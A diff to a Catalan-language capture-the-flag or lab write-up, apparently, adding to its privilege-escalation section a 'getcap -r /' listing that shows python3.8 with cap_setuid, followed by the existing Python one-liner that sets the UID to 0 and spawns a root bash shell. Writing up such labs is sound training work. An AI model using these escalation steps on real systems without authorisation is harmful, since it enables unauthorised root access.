@@ -56,6 +56,15 @@ Si provem les credencials al servidor FTP podem accedir-hi, i podem veure el que
 
 ## Privilege escalation
 Llistant les _capabilities_ del host, podem veure que Python3.8 té assignat _cap_setuid_, pel que es pot utilitzar aquest binari per a manipular el UID d'un procés i, doncs, pot fer-se servir per tenir una consola amb UID 0 (root).
+````bash
+> getcap -r / 2>/dev/null
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+````
 ````python
 >>> import os; os.setuid(0); os.system("/bin/bash")
 ````
